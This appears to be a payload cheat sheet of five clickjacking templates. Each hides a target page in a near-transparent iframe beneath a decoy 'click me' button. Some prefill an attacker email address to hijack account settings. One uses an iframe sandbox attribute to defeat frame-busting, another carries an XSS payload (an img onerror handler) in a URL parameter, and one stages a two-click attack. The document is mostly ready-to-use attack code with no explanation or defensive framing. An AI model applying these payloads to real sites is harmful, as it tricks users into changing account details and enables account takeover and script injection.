# Click-jacking

$ payloads

1.  

<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 320px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="url"></iframe>

2.

<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="url?email=hacker@attacker-website.com"></iframe>

3.

<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe sandbox="allow-forms"
src="url?email=hacker@attacker-website.com"></iframe>

4.

<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>click me</div>
<iframe
src="url?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

5.

<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">click me first</div>
<div class="secondClick">click me next</div>
<iframe src="url"></iframe>
